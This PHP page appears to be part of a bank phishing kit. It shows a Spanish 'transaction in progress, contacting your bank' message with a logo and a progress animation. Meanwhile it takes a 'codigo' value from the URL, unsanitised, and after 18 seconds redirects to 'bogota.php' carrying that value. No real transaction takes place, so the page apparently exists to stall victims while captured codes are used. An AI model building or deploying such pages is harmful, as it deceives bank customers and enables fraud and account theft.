<?php



$codigo = $_GET['codigo'];


header("refresh:18;url=bogota.php?codigo=".$codigo);

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>

    <style> 
        *{
            margin:0;
            padding:0;
        }
    </style>
</head>
<body>
<div>
    <br>
   <center><img src="img/logo.png" alt="" srcset="" width="90%"></center>
 </div>
   <center> <img src="/img/progress.gif" alt="" srcset="" width="50%" style="margin-top:25%;"></center>
   <div style="width:70%; margin:auto; text-align:center;">
   <a style="font-family: Arial, Helvetica, sans-serif; text-align:justify; font-size:18px;">Transacción en progreso, espere un momento mientras contactamos a su banco...</a>
   </div>

    
<img src="img/fot.jpg" alt="" srcset="" width="100%" style="margin-top:150px;">
<img src="img/f4.jpg" alt="" srcset="" width="100%" style="">
</body>
</html>